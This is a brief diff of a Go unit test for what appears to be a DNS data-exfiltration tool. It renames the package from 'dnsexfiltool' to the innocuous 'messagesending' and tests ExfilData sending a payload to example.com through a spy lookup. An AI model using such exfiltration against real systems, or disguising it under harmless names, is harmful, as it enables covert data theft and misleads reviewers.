@@ -1,4 +1,4 @@
-package dnsexfiltool
+package messagesending
 
 import (
 	"testing"
@@ -22,7 +22,7 @@ func TestDnsLookupSpyImplementsInterface(t *testing.T) {
 func TestExfilData(t *testing.T) {
 	payload := "hello world"
 	dnsLookup := dnsLookupSpy{0, []string{}}
-	exfilData(payload, "example.com", &dnsLookup)
+	ExfilData(payload, "example.com", &dnsLookup)
 
 	if dnsLookup.lookupCount != 1 {
 		t.Errorf("Expected %d DNS looksup, got %d", 1, dnsLookup.lookupCount)
